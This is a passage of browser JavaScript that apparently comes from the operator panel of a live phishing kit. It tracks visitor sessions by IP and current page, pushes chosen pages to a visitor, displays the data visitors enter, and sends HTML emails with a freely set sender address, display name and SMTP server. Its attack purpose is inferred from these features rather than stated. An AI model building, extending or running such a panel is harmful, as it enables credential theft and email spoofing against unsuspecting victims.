          `var(--icon-bg-${activeConnection.iconBackgroundType})`, 'important');
  }
  
  const workflowList = document.getElementById('workflowMainList');
  const workflowInfo = document.getElementById('workflowPagesDisplay');
  
  let isInValidArea = false;
  
  if (workflowList) {
      const rect = workflowList.getBoundingClientRect();
      if (e.clientX >= rect.left && e.clientX <= rect.right && 
          e.clientY >= rect.top && e.clientY <= rect.bottom) {
          isInValidArea = true;
      }
  }
  
  if (workflowInfo && !isInValidArea) {
      const rect = workflowInfo.getBoundingClientRect();
      if (e.clientX >= rect.left && e.clientX <= rect.right && 
          e.clientY >= rect.top && e.clientY <= rect.bottom) {
          isInValidArea = true;
      }
  }
  
  if (!isInValidArea) {
      connectionLine.style.display = 'none';
      
      if (activeConnection.sourceIcon) {
          activeConnection.sourceIcon.style.removeProperty('box-shadow');
          activeConnection.sourceIcon.classList.remove(`connection-${activeConnection.iconType}`);
      }
      
      activeConnection = null;
  } else {
      connectionLine.style.display = 'block';
  }
}

function handleGlobalMouseUp(e) {
  if (!activeConnection) return;
  
  const targetElements = document.elementsFromPoint(e.clientX, e.clientY);
  const targetIcon = targetElements.find(el => 
      el.classList.contains('workflow-icon') && 
      el.dataset.iconSystemInitialized === 'true' && 
      el !== activeConnection.sourceIcon);
  
  if (activeConnection.sourceIcon) {
      activeConnection.sourceIcon.style.removeProperty('box-shadow');
      activeConnection.sourceIcon.classList.remove(`connection-${activeConnection.iconType}`);
  }
  
  if (targetIcon) {
      handleConnection(targetIcon);
  } else {
      connectionLine.style.display = 'none';
      activeConnection = null;
  }
}

function findConnection(source, target) {
  const found = connections.find(conn => 
      (conn.source === source && conn.target === target) || 
      (conn.source === target && conn.target === source)
  );
  
  return found;
}

    function removeConnection(connection, sourcePageId, targetPageId, dataType) {
       if (connection.element && connection.element.parentNode) {
          connection.element.parentNode.removeChild(connection.element);
       }
       if (sourcePageId && targetPageId && dataType) {
          socket.emit('workflow_remove_link', {
             from: sourcePageId,
             to: targetPageId,
             value: dataType
          });
       }
       connections = connections.filter(conn => conn !== connection);
    }


    function restoreConnections(savedConnectionData = null) {
      let connectionData = [];
      
      if (savedConnectionData && Array.isArray(savedConnectionData)) {
        connectionData = savedConnectionData.map(conn => ({
          sourcePageId: conn.sourcePageId,
          targetPageId: conn.targetPageId,
          dataType: conn.dataType
        }));
      } else {
        connections.forEach((conn) => {
          if (conn.sourcePageId && conn.targetPageId && conn.dataType) {
            const existingConnection = connectionData.find(
              existing => 
                existing.sourcePageId === conn.sourcePageId && 
                existing.targetPageId === conn.targetPageId && 
                existing.dataType === conn.dataType
            );
            
            if (!existingConnection) {
              connectionData.push({
                sourcePageId: conn.sourcePageId,
                targetPageId: conn.targetPageId,
                dataType: conn.dataType
              });
            }
          }
        });
      }
      
      if (connectionData.length === 0) return;
      
      function verifyAndRestore() {
        const workflowMainList = document.getElementById('workflowMainList');
        if (!workflowMainList) {
          setTimeout(verifyAndRestore, 50);
          return;
        }
        
        const activeConnections = connectionData.filter(data => {
          const sourceInMain = !!workflowMainList.querySelector(`[data-id="${data.sourcePageId}"], [data-id="/${data.sourcePageId}"]`);
          const targetInMain = !!workflowMainList.querySelector(`[data-id="${data.targetPageId}"], [data-id="/${data.targetPageId}"]`);
          return sourceInMain && targetInMain;
        });
        
        if (activeConnections.length === 0) {
          return;
        }
        
        let allIconsReady = true;
        
        for (const data of activeConnections) {
          const sourceCard = workflowMainList.querySelector(`[data-id="${data.sourcePageId}"], [data-id="/${data.sourcePageId}"]`);
          const targetCard = workflowMainList.querySelector(`[data-id="${data.targetPageId}"], [data-id="/${data.targetPageId}"]`);
          
          if (!sourceCard || !targetCard) {
            allIconsReady = false;
            break;
          }
          
          const sourceIcons = sourceCard.querySelectorAll('.workflow-icon');
          const targetIcons = targetCard.querySelectorAll('.workflow-icon');
          
          if (sourceIcons.length === 0 || targetIcons.length === 0) {
            allIconsReady = false;
            break;
          }
        }
        
        if (!allIconsReady) {
          setTimeout(verifyAndRestore, 50);
          return;
        }
        
        const connectionContainer = ensureConnectionContainer();
        if (!connectionContainer) return;
        
        if (savedConnectionData) {
          for (let i = connections.length - 1; i >= 0; i--) {
            const conn = connections[i];
            if (conn.element && conn.element.parentNode) {
              conn.element.parentNode.removeChild(conn.element);
            }
            connections.splice(i, 1);
          }
        }
        
        const createdConnections = new Set();
        
        activeConnections.forEach((data) => {
          const connectionKey = `${data.sourcePageId}:${data.targetPageId}:${data.dataType}`;
          
          if (createdConnections.has(connectionKey)) {
            return;
          }
          
          createdConnections.add(connectionKey);
          
          const sourceCard = workflowMainList.querySelector(`[data-id="${data.sourcePageId}"], [data-id="/${data.sourcePageId}"]`);
          const targetCard = workflowMainList.querySelector(`[data-id="${data.targetPageId}"], [data-id="/${data.targetPageId}"]`);
          
          let sourceIcon = null;
          let targetIcon = null;
          
          sourceCard.querySelectorAll('.workflow-icon').forEach(icon => {
            const title = icon.getAttribute('title') || '';
            const iconType = icon.getAttribute('data-icon-type') || title.split(':')[1]?.trim();
            const isProvider = title.startsWith('Receives:');
            
            if (iconType === data.dataType && isProvider) {
              sourceIcon = icon;
            }
          });
          
          targetCard.querySelectorAll('.workflow-icon').forEach(icon => {
            const title = icon.getAttribute('title') || '';
            const iconType = icon.getAttribute('data-icon-type') || title.split(':')[1]?.trim();
            const isRequirer = title.startsWith('Required:');
            
            if (iconType === data.dataType && isRequirer) {
              targetIcon = icon;
            }
          });
          
          if (sourceIcon && targetIcon) {
            createConnectionElement(
              sourceIcon, 
              targetIcon, 
              data.sourcePageId, 
              data.targetPageId, 
              data.dataType, 
              connectionContainer
            );
          }
        });
      }
      
      const workflowMainList = document.getElementById('workflowMainList');
      if (workflowMainList) {
        const existingIcons = workflowMainList.querySelectorAll('.workflow-icon[data-icon-system-initialized="true"]');
        if (existingIcons.length > 0) {
          setTimeout(verifyAndRestore, 100);
          return;
        }
      }
      
      let eventHandlerCalled = false;
      const iconReadyHandler = () => {
        if (eventHandlerCalled) return;
        eventHandlerCalled = true;
        document.removeEventListener('workflow-icons-ready', iconReadyHandler);
        setTimeout(verifyAndRestore, 100);
      };
      
      document.addEventListener('workflow-icons-ready', iconReadyHandler);
      
      setTimeout(() => {
        if (!eventHandlerCalled) {
          document.removeEventListener('workflow-icons-ready', iconReadyHandler);
          verifyAndRestore();
        }
      }, 500);
    }

    function createPermanentConnection(sourceIcon, targetIcon, sourcePageId, targetPageId, dataType) {
       const connectionContainer = ensureConnectionContainer();
       if (!connectionContainer) {
          return;
       }
       if (sourcePageId && targetPageId && dataType) {
          socket.emit('workflow_create_link', {
             from: sourcePageId,
             to: targetPageId,
             value: dataType,
             session_id: state.selectedSession.id
          });
       }
       const sourceRect = sourceIcon.getBoundingClientRect();
       const targetRect = targetIcon.getBoundingClientRect();
       const containerRect = connectionContainer.getBoundingClientRect();
       const sourceX = sourceRect.left + sourceRect.width / 2 - containerRect.left;
       const sourceY = sourceRect.top + sourceRect.height / 2 - containerRect.top;
       const targetX = targetRect.left + targetRect.width / 2 - containerRect.left;
       const targetY = targetRect.top + targetRect.height / 2 - containerRect.top;
       const dx = targetX - sourceX;
       const dy = targetY - sourceY;
       const length = Math.sqrt(dx * dx + dy * dy);
       const angle = Math.atan2(dy, dx) * 180 / Math.PI;
       const connection = document.createElement('div');
       connection.className = 'icon-connection';
       const connDataType = dataType || sourceIcon.dataset.iconType || 'default';
       connection.classList.add(`connection-${connDataType}`);
       connection.style.left = sourceX + 'px';
       connection.style.top = sourceY + 'px';
       connection.style.width = length + 'px';
       connection.style.transform = `rotate(${angle}deg)`;
       connectionContainer.appendChild(connection);
       connections.push({
          source: sourceIcon,
          target: targetIcon,
          element: connection,
          dataType: connDataType,
          sourcePageId: sourcePageId,
          targetPageId: targetPageId
       });
       sourceIcon.style.outline = `2px solid currentColor`;
       targetIcon.style.outline = `2px solid currentColor`;
       sourceIcon.classList.add(`connection-${connDataType}`);
       targetIcon.classList.add(`connection-${connDataType}`);
       setTimeout(() => {
          sourceIcon.style.outline = '';
          targetIcon.style.outline = '';
          sourceIcon.classList.remove(`connection-${connDataType}`);
          targetIcon.classList.remove(`connection-${connDataType}`);
       }, 800);
    }

    function isElementInContainer(pageId, container) {
      if (!container) return false;
      const pageElement = Array.from(container.querySelectorAll('[data-page-id]'))
         .find(el => el.getAttribute('data-page-id') === pageId);
      return !!pageElement;
   }

   function updateConnections() {
    const connectionContainer = ensureConnectionContainer();
    if (!connectionContainer) return;
    const containerRect = connectionContainer.getBoundingClientRect();
    
    const workflowMainList = document.getElementById('workflowMainList');
    const workflowPagesDisplay = document.getElementById('workflowPagesDisplay');
    
    if (workflowMainList && !activeConnection) {
        const mainListPageIds = Array.from(workflowMainList.querySelectorAll('.workflow-card, .card-preview'))
            .map(card => card.dataset.id?.replace(/^\/+/, ''))
            .filter(id => id);
            
        const infoPageIds = Array.from(workflowPagesDisplay?.querySelectorAll('.workflow-card, .card-preview') || [])
            .map(card => card.dataset.id?.replace(/^\/+/, ''))
            .filter(id => id); 
    
        const invalidConnections = connections.filter(conn => {
            if (!conn || !conn.source || !conn.target || !conn.sourcePageId || !conn.targetPageId) {
                return true; 
            }

            try {
                const isWorkflowInfoConn = conn.source.closest('#workflowPagesDisplay') || conn.target.closest('#workflowPagesDisplay');
                
                if (isWorkflowInfoConn) {
                    const sourcePageExists = infoPageIds.includes(conn.sourcePageId);
                    const targetPageExists = infoPageIds.includes(conn.targetPageId);
                    return !(sourcePageExists && targetPageExists);
                } else {
                    const sourcePageExists = mainListPageIds.includes(conn.sourcePageId);
                    const targetPageExists = mainListPageIds.includes(conn.targetPageId);
                    return !(sourcePageExists && targetPageExists);
                }
            } catch (error) {
                return true; 
            }
        });
        
        if (invalidConnections.length > 0) {
            invalidConnections.forEach(conn => {
                removeConnection(conn, conn.sourcePageId, conn.targetPageId, conn.dataType);
            });
            
            if (invalidConnections.length === 1) {
                const conn = invalidConnections[0];
                showToast(`Removed connection from "${conn.sourcePageId}" to "${conn.targetPageId}" for value "${conn.dataType}"`, 'info');
            } else {
                const connectionDetails = invalidConnections.map(conn => 
                    `"${conn.sourcePageId}" to "${conn.targetPageId}" (${conn.dataType})`
                ).join(', ');
                showToast(`Removed ${invalidConnections.length} connections: ${connectionDetails}`, 'info');
            }
        }
    }
    
    connections.forEach(conn => {
        try {
            if (!conn || !conn.source || !conn.target || !conn.element) return;

            const sourceRect = conn.source.getBoundingClientRect();
            const targetRect = conn.target.getBoundingClientRect();
            const sourceX = sourceRect.left + sourceRect.width / 2 - containerRect.left;
            const sourceY = sourceRect.top + sourceRect.height / 2 - containerRect.top;
            const targetX = targetRect.left + targetRect.width / 2 - containerRect.left;
            const targetY = targetRect.top + targetRect.height / 2 - containerRect.top;
            const dx = targetX - sourceX;
            const dy = targetY - sourceY;
            const length = Math.sqrt(dx * dx + dy * dy);
            const angle = Math.atan2(dy, dx) * 180 / Math.PI;
            conn.element.style.left = sourceX + 'px';
            conn.element.style.top = sourceY + 'px';
            conn.element.style.width = length + 'px';
            conn.element.style.transform = `rotate(${angle}deg)`;
        } catch (error) {
        }
    });
    
    if (typeof window.updateInputsBasedOnConnections === 'function') {
        window.updateInputsBasedOnConnections();
    }
}
 return {
  init,
  scanForIcons,
  updateConnections,
  restoreConnections,
  getConnections: function() {
    return connections; 
  },
  setConnections: function(newConnections) {
    connections = newConnections || [];
  },
  clearAllConnections: function() {
    connections = [];
    const existingConnections = document.querySelectorAll('.connection-line');
    existingConnections.forEach(el => el.remove());
  }
}})();
 window.addEventListener('resize', function() {
    if (document.getElementById('workflowProgressBar')) {
       renderWorkflowProgress();
    }
    iconConnectionSystem.updateConnections();
 });

 setTimeout(() => {
    iconConnectionSystem.init();
 }, 1000);
 if (!state.workflowInputValues) {
    state.workflowInputValues = {};
 }

 initProgressUI();
 renderWorkflowPresets();
 renderWorkflow();

 function updateInputsBasedOnConnections() {
  const connections = iconConnectionSystem.getConnections ? iconConnectionSystem.getConnections() : [];
  
  const requiredInfoContainer = document.getElementById('requiredInfoContainer');
  if (requiredInfoContainer) {
    const pageId = state.selectedPage;
    if (!pageId) return;
    
    const inputs = requiredInfoContainer.querySelectorAll('input');
    inputs.forEach(input => {
      const dataVar = input.getAttribute('data-var');
      if (!dataVar) return;
      
      const connection = connections.find(conn => {
        return conn.targetPageId === pageId && conn.dataType === dataVar;
      });
      
      if (connection) {
        input.disabled = true;
        input.value = '';
        input.placeholder = `${connection.sourcePageId} datalinked`;
        input.classList.add('receiving-data');
        const label = input.closest('div').previousElementSibling;
        if (label) {
          label.classList.add('receiving-data-label');
        }
      } else {
        const selectedPageData = state.availablePages.find(page => page.id === pageId);
        if (selectedPageData && selectedPageData.required_data) {
          const fieldData = selectedPageData.required_data.find(field => (field.placeholder_name || field.value) === dataVar);
          if (fieldData) {
            input.disabled = false;
            input.placeholder = fieldData.placeholder || '';
            input.classList.remove('receiving-data');
            const label = input.closest('div').previousElementSibling;
            if (label) {
              label.classList.remove('receiving-data-label');
            }
          }
        }
      }
    });
  }
  
  const progressSteps = document.querySelectorAll('.progress-step');
  progressSteps.forEach(step => {
    const pageId = step.getAttribute('data-page');
    if (!pageId) return;
    
    const inputContainers = step.querySelectorAll('.step-input-container');
    inputContainers.forEach(container => {
      const inputs = container.querySelectorAll('input.step-input');
      inputs.forEach(input => {
        const dataField = input.getAttribute('data-field'); 
        if (!dataField) return;
        
        if (!input.hasAttribute('data-original-placeholder')) {
          input.setAttribute('data-original-placeholder', input.placeholder);
        }
        
        const connection = connections.find(conn => {
          return conn.targetPageId === pageId && conn.dataType === dataField;
        });
        
        if (connection) {
          input.disabled = true;
          input.value = ''; 
          input.placeholder = `${connection.sourcePageId} datalinked`;
          input.classList.add('receiving-data');
          
          const label = container.querySelector('.step-input-label');
          if (label) {
            label.classList.add('receiving-data-label');
          }
        } else {
          input.disabled = false;
          
          const originalPlaceholder = input.getAttribute('data-original-placeholder');
          input.placeholder = originalPlaceholder || '';
          
          input.classList.remove('receiving-data');
          
          const label = container.querySelector('.step-input-label');
          if (label) {
            label.classList.remove('receiving-data-label');
          }
        }
      });
    });
  });
}

window.updateInputsBasedOnConnections = updateInputsBasedOnConnections;

function renderActivityTimeline() {
  const activityTimeline = document.getElementById('activityTimeline');
  
  if (!activityTimeline) {
      return;
  }
  
  if (!state.selectedSession || !state.selectedSession.activity_log || !Array.isArray(state.selectedSession.activity_log)) {
      activityTimeline.innerHTML = '<div class="p-4 text-center">No activity recorded</div>';
      return;
  }
  
  try {
      activityTimeline.innerHTML = [...state.selectedSession.activity_log].reverse().map(activity => {
          const timeDiff = activity.timestamp ? Date.now() - activity.timestamp * 1000 : 0;
          let timeAgo = 'Time unknown';
          
          if (activity.timestamp) {
              const seconds = Math.floor(timeDiff / 1000);
              if (seconds < 60) {
                  timeAgo = `${seconds} ${seconds === 1 ? 'second' : 'seconds'} ago`;
              } else {
                  const minutes = Math.floor(seconds / 60);
                  timeAgo = `${minutes} ${minutes === 1 ? 'minute' : 'minutes'} ago`;
              }
          }
          
          return `
          <div class="p-4 hover:bg-secondary-light dark:hover:bg-secondary-dark transition-colors">
              <div class="flex items-start gap-4">
                  <div class="flex-shrink-0">
                      <div class="h-10 w-10 rounded-full bg-box border border-secondary-light dark:border-secondary-dark flex items-center justify-center">
                          ${activity.icon || ''}
                      </div>
                  </div>
                  <div class="min-w-0 flex-1">
                      <p class="text-sm font-medium text-text-light dark:text-text-color">${activity.text || ''}</p>
                      <p class="mt-1 text-xs text-text-light/60 dark:text-text-color/60">
                          ${activity.timestamp ? `${new Date(activity.timestamp * 1000).toLocaleTimeString()} (${timeAgo})` : 'Time unknown'}
                      </p>
                  </div>
                  ${activity.type === 'input' ? `
                        <button class="activity-input-btn btn btn-secondary" data-page-key="${activity.pageKey || ''}"> 
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/>
                        </svg>
                    </button>
                ` : ''}
              </div>
          </div>
      `}).join('');
      
      document.querySelectorAll('.activity-input-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const pageKey = btn.getAttribute('data-page-key');

            if (pageKey) {
                setSessionManagerTab('pages'); 

                setTimeout(() => {
                    const pageSection = document.querySelector(`#sessionManagerModal .collapsible-section[data-page="${pageKey}"]`);

                    if (pageSection) {
                        const collapsibleSection = pageSection; 

                        if (collapsibleSection) {
                            if (!collapsibleSection.classList.contains('open')) {
                                const header = collapsibleSection.querySelector('.collapsible-header');
                                if (header) {
                                    header.click(); 
                                }
                            }

                            requestAnimationFrame(() => {
                               collapsibleSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
                            });
                        } 
                    } else {
                         const inputPanel = document.getElementById('userInputData');
                         if (inputPanel) inputPanel.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    }
                }, 300); 
            } else {
            }
        });
    });
  } catch (error) {
      activityTimeline.innerHTML = '<div class="p-4 text-center">Error rendering activity log</div>';
  }
}


function updateActivityLog() {
  if (!state.selectedSession) return;
  
  if (state.selectedSession.activity_log && Array.isArray(state.selectedSession.activity_log)) {
    renderActivityTimeline();
  } else {
    const activityTimeline = document.getElementById('activityTimeline');
    if (activityTimeline) {
      activityTimeline.innerHTML = '<div class="p-4 text-center">No activity recorded</div>';
    }
  }
}


socket.on('client_activity_update', function(data) {
  const sessionIndex = state.sessions.findIndex(s => s.id === data.session_id);

  if (sessionIndex !== -1) {
    state.sessions[sessionIndex].last_activity = data.last_activity;
    state.sessions[sessionIndex].current_page = data.current_page || data.page;

    if (data.activity_log) {
      state.sessions[sessionIndex].activity_log = data.activity_log;
    }

      updateConnectionDetails();
      updateSessionManager();
      renderActivityTimeline();
    renderSessionsTable();
  }
});
function updateSessionManager() {
  if (!state.sessionManagerVisible) return;
  
  const sessionIp = document.getElementById('sessionIp');
  if (sessionIp && state.selectedSession) {
      sessionIp.textContent = state.selectedSession.ip;
  }

  const viewingPageText = document.getElementById('viewingPageText');
  if (viewingPageText) {
       viewingPageText.textContent = state.selectedSession?.current_page || "None";
  }
 
  const sendToUserButton = document.getElementById('sendToUser');
  if (!sendToUserButton) return; 

  if (state.selectedPage) {
      let enableButton = false;
      if (!state.showRequiredInfo) {
          enableButton = true; 
      } else {
          const requiredInput = document.querySelector('#requiredInfoContainer input[data-var]');
          if (requiredInput) {
              const inputValue = requiredInput.value.trim();
              state.requiredInfoValue = inputValue;
              enableButton = inputValue !== '';
          }
      }

      if (enableButton) {
          sendToUserButton.classList.remove('btn-disabled');
          sendToUserButton.classList.add('btn-primary');
          sendToUserButton.style.cursor = 'pointer';
      } else {
          sendToUserButton.classList.add('btn-disabled');
          sendToUserButton.classList.remove('btn-primary');
          sendToUserButton.style.cursor = 'not-allowed';
      }
  } else {
      sendToUserButton.classList.add('btn-disabled');
      sendToUserButton.classList.remove('btn-primary');
      sendToUserButton.style.cursor = 'not-allowed';
  }
}

  htmlTemplateFile.addEventListener('change', function(event) {
    const file = event.target.files[0];
    if (file) {
      htmlFilePath.value = file.name;
      
      const reader = new FileReader();
      reader.onload = function(e) {
        const htmlContent = e.target.result;
        emailTemplate.value = htmlContent;
        updateEmailPreview();
      };
      reader.readAsText(file);
    }
  });

  embedImageFile.addEventListener('change', function(event) {
    const file = event.target.files[0];
    if (file) {
      embedImagePath.value = file.name;
      
      const reader = new FileReader();
      reader.onload = function(e) {
        const base64Image = e.target.result;
        const imgTag = `<img src="${base64Image}" alt="Embedded Image" style="max-width: 100%;">`;
        
        const cursorPos = emailTemplate.selectionStart;
        const textBefore = emailTemplate.value.substring(0, cursorPos);
        const textAfter = emailTemplate.value.substring(cursorPos);
        
        emailTemplate.value = textBefore + imgTag + textAfter;
        updateEmailPreview();
      };
      reader.readAsDataURL(file);
    }
  });
  
  [emailRecipient, emailSender, emailDisplayName, emailSubject, emailTemplate].forEach(el => {
    el.addEventListener('input', updateEmailPreview);
  });

  document.getElementById('emailSendForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    if (!emailRecipient.value) {
      showToast('Recipient email is required', 'error');
      return;
    }
    
    if (!emailTemplate.value) {
      showToast('Email content is required', 'error');
      return;
    }
    
    const smtpSelect = document.getElementById('emailSmtp');
    if (!smtpSelect.value || smtpSelect.value === 'add-smtp' || smtpSelect.value === '') {
      showToast('Please select an SMTP server', 'error');
      return;
    }
    
    let embedImageBase64 = null;
    if (embedImageFile.files.length > 0) {
      const reader = new FileReader();
      embedImageBase64 = await new Promise((resolve) => {
        reader.onload = e => resolve(e.target.result);
        reader.readAsDataURL(embedImageFile.files[0]);
      });
    }
    
    const formData = {
      recipient: emailRecipient.value,
      senderEmail: emailSender.value,
      displayName: emailDisplayName.value,
      replyEmail: emailReplyTo.value,
      subject: emailSubject.value,
      smtpId: smtpSelect.value,
      htmlContent: emailTemplate.value,
      embedImage: embedImageBase64
    };
    
    const submitBtn = this.querySelector('button[type="submit"]');
    const originalBtnText = submitBtn.innerHTML;
    submitBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 animate-spin mr-2" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"/><path d="M12 2a10 10 0 0 1 10 10" stroke-opacity="0.75"/></svg> Sending...`;
    submitBtn.disabled = true;
    
    try {
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
      });
      
      const data = await response.json();
      
      if (data.success) {
        showToast(`Email sent successfully to ${formData.recipient}`, 'success');
      } else {
        showToast(`Failed to send email: ${data.message}`, 'error');
      }
    } catch (error) {
      logErrorToServer(error);
      showToast('Failed to send email due to a network error', 'error');
    } finally {
      submitBtn.innerHTML = originalBtnText;
      submitBtn.disabled = false;
    }
  });


  function updateEmailPreview() {
    if (previewRecipient) {
      previewRecipient.textContent = emailRecipient.value || 'recipient@example.com';
    }
    
    if (previewSender) {
      const senderText = [];
      if (emailDisplayName && emailDisplayName.value) senderText.push(emailDisplayName.value);
      if (emailSender && emailSender.value) senderText.push(`<${emailSender.value}>`);
      previewSender.textContent = senderText.join(' ') || 'support@company.com';
    }
    
    if (previewSubject) {
      previewSubject.textContent = emailSubject.value || 'No subject';
    }
    
    const emailPreviewIframe = document.getElementById('emailPreviewIframe');
    if (!emailPreviewIframe) return;
    
    const emailTemplate = document.getElementById('emailTemplate');
    if (!emailTemplate) return;
    
    let htmlContent = emailTemplate.value || '';
    
    if (htmlContent && !/<[a-z][\s\S]*>/i.test(htmlContent)) {
      htmlContent = htmlContent.split('\n').map(line => {
        if (!line.trim()) return '';
        return `<p>${line}</p>`;
      }).join('');
    } else if (!htmlContent.trim()) {
      htmlContent = '<p>Email content will appear here...</p>';
    }
    
    const computedStyle = getComputedStyle(document.documentElement);
    const textColor = computedStyle.getPropertyValue('--text-color') || '#e8efff';
    
    const iframeDoc = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          padding: 10px;
          font-family: sans-serif;
          overflow: hidden;
          color: ${textColor};
        }
        .email-content-wrapper {
          transform: scale(0.8);
          transform-origin: top left;
          width: calc(100% / 0.8);
        }
        p { margin-bottom: 1em; }
      </style>
    </head>
    <body>
      <div class="email-content-wrapper">
        ${htmlContent}
      </div>
    </body>
    </html>
    `;
    
    emailPreviewIframe.srcdoc = iframeDoc;
    
    emailPreviewIframe.onload = function() {
      try {
        const frameHeight = emailPreviewIframe.contentWindow.document.body.scrollHeight;
        emailPreviewIframe.style.height = (frameHeight * 0.8 + 20) + 'px';
      } catch(e) {
        emailPreviewIframe.style.height = '300px';
      }
    };
  }  
  
  if (emailRecipient) emailRecipient.addEventListener('input', updateEmailPreview);
  if (emailSender) emailSender.addEventListener('input', updateEmailPreview);
  if (emailDisplayName) emailDisplayName.addEventListener('input', updateEmailPreview);
  if (emailReplyTo) emailReplyTo.addEventListener('input', updateEmailPreview);
  if (emailSubject) emailSubject.addEventListener('input', updateEmailPreview);
  if (emailTemplate) emailTemplate.addEventListener('input', updateEmailPreview);
  
  if (htmlTemplateFile && htmlFilePath && emailTemplate) {
    htmlTemplateFile.addEventListener('change', function(event) {
      const file = event.target.files[0];
      if (file) {
        htmlFilePath.value = file.name;
        
        const reader = new FileReader();
        reader.onload = function(e) {
          emailTemplate.value = e.target.result;
          updateEmailPreview();
        };
        reader.readAsText(file);
      }
    });
  }
  
  if (embedImageFile && embedImagePath && emailTemplate) {
    embedImageFile.addEventListener('change', function(event) {
      const file = event.target.files[0];
      if (file) {
        embedImagePath.value = file.name;
        
        const reader = new FileReader();
        reader.onload = function(e) {
          const base64Image = e.target.result;
          const imgTag = `<img src="${base64Image}" alt="Embedded Image" style="max-width: 100%;">`;
          
          const cursorPos = emailTemplate.selectionStart;
          const textBefore = emailTemplate.value.substring(0, cursorPos);
          const textAfter = emailTemplate.value.substring(cursorPos);
          
          emailTemplate.value = textBefore + imgTag + textAfter;
          updateEmailPreview();
        };
        reader.readAsDataURL(file);
      }
    });
  }
  
  updateEmailPreview();




  document.getElementById('toggleUserInputsBtn').addEventListener('click', function() {
    const btn = this;
    const isExpanded = btn.getAttribute('data-expanded') === 'true';
    const newExpandedState = !isExpanded;
    
    btn.setAttribute('data-expanded', newExpandedState ? 'true' : 'false');
    
    if (newExpandedState) {
      btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`;
      btn.title = "Hide all panels";
    } else {
      btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>`;
      btn.title = "Show all panels";
    }
    
    const grid = document.getElementById('userInputDataGrid');
    const collapsibles = grid.querySelectorAll('.collapsible-section');
    collapsibles.forEach(section => {
      if (newExpandedState) {
        section.classList.add('open');
        const content = section.querySelector('.collapsible-content');
        if (content) {
          content.style.display = 'block';
        }
      } else {
        section.classList.remove('open');
        const content = section.querySelector('.collapsible-content');
        if (content) {
          content.style.display = '';
        }
      }
    });
  });


  socket.on('panel_update', function(data) {
      const { session_id, input_data, page_route } = data;

      const pageRouteWithoutSlash = page_route.startsWith('/') ? page_route.slice(1) : page_route;

      const userInputDataGrid = document.getElementById('userInputDataGrid');
      
      if (!userInputDataGrid) {
          logErrorToServer(error);
          return;
      }

      const pageDiv = userInputDataGrid.querySelector(`[data-page="${pageRouteWithoutSlash}"]`);

      if (!pageDiv) {
          logErrorToServer(error);
          return;
      }

      const section = pageDiv.querySelector(`[data-session-id="${session_id}"]`);

      if (!section) {
          logErrorToServer(error);
          return;
      }
      const collapsibleContent = section.querySelector('.collapsible-content');

      if (!collapsibleContent) {
          logErrorToServer(error);
          return;
      }

      input_data.forEach(input => {
          const pageDivInsideSection = collapsibleContent.querySelector(`[data-page="${input.page}"]`);

          if (!pageDivInsideSection) {
              logErrorToServer(error);
              return;
          }

          const collapsibleContentInsideDiv = pageDivInsideSection.querySelector('.collapsible-content');

          if (!collapsibleContentInsideDiv) {
              logErrorToServer(error);
              return;
          }

          const existingInputs = collapsibleContentInsideDiv.querySelectorAll('input');
          existingInputs.forEach(inputElement => inputElement.remove());

          input_data.forEach(input => {
              const newInput = document.createElement('input');
              newInput.type = input.type || 'text';
              newInput.name = input.value;
              newInput.placeholder = input.placeholder || '';
              newInput.value = input.value || '';
              
              collapsibleContentInsideDiv.appendChild(newInput);
          });
      });
  });




  function handleEmailInputChange() {
    state.emailForm = {
      recipient: emailRecipient.value,
      sender: emailSender.value,
      subject: emailSubject.value,
      template: emailTemplate.value
    };
    updateEmailPreview();
  }

  function saveNotificationsToCookie() {
    setCookie("notifications", JSON.stringify(state.notifications), 365);
  }
  
  function loadNotificationsFromCookie() {
    const cookie = getCookie("notifications");
    if (cookie) {
      try {
        state.notifications = JSON.parse(cookie);
      } catch (e) {
        logErrorToServer(error);
      }
    }
  }
  

  function loadNotifications() {
    const notificationsCookie = getCookie("notifications");
    if (notificationsCookie) {
      try {
        state.notifications = JSON.parse(notificationsCookie);
      } catch (e) {
        state.notifications = [];
      }
    }
  }

  function clearNotifications() {
    state.notifications = [];
    setCookie("notifications", JSON.stringify(state.notifications), 365);
    showToast('All notifications cleared', 'success');
    updateUI();
  }
  

  function addNotification(newNotification) {
    newNotification.unread = true;
  
    newNotification.timestamp = Date.now();
  
    state.notifications.unshift(newNotification);
  
    while (state.notifications.length > 10) {
      state.notifications.pop();
    }
  
    saveNotificationsToCookie();
    updateUI();

    const formattedTime = timeSince2(newNotification.timestamp); 
    
    showToast(`${newNotification.title}: ${newNotification.message} (${formattedTime})`, 'info');
}
  
let activeToasts = [];


function showToast(message, type = 'info') {
    if (!state.showNotifications) return;

    const toast = document.createElement('div');
    toast.className = 'toast';
    
    let icon = '';
